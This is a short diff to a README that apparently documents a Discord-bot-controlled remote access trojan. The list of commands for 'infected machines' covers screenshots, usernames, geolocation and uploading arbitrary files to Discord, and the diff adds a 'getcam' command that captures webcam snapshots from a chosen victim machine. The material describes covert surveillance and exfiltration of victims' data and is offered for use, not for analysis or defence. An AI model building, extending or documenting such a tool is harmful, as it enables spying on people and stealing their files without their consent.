@@ -28,6 +28,7 @@ You can use the following commands to control infected machines via a Discord bo
 Note: Prefix can be customised
 ```
 get : Get username, machine name and screenshot of all infected machines.
+getcam : Get snapshot from all video sources on specified machine.
 getfile {machine_name} {file_path} : Upload file located in {file_path} on specified machine to Discord.
 ipinfo {machine_name} : Get IP address and geolocation of specified machine.
 
